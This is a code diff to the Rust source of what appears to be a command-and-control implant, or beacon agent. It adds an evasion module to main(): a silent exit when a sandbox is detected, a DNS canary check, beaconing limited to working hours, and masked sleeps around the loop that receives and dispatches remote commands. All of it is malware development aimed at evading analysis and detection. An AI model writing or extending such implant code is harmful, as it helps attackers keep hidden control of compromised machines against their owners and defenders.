@@ -6,6 +6,7 @@ mod config {
 mod crypto;
 mod transport;
 mod commands;
+mod evasion;
 
 use std::thread;
 use std::time::Duration;
@@ -30,6 +31,12 @@ fn sleep_ms() -> u64 {
 }
 
 fn main() {
+    // Evasion: exit silently if running in a sandbox, then fire DNS canary
+    evasion::sandbox_check();
+    if !config::CANARY_DOMAIN.is_empty() {
+        evasion::dns_canary_check(config::CANARY_DOMAIN);
+    }
+
     let mut t = transport::AgentTransport::new();
 
     // Registration loop — retry every 30 s until success
@@ -40,10 +47,16 @@ fn main() {
 
     // Beacon loop
     loop {
+        // Working hours enforcement — sleep 60 s and re-check if outside the window
+        if !config::WORKING_HOURS.is_empty() && !evasion::in_working_hours(config::WORKING_HOURS) {
+            evasion::sleep_masked(60_000);
+            continue;
+        }
+
         let tasks = t.beacon();
         for task in tasks {
             commands::dispatch(&mut t, &task);
         }
-        thread::sleep(Duration::from_millis(sleep_ms()));
+        evasion::sleep_masked(sleep_ms());
     }
 }
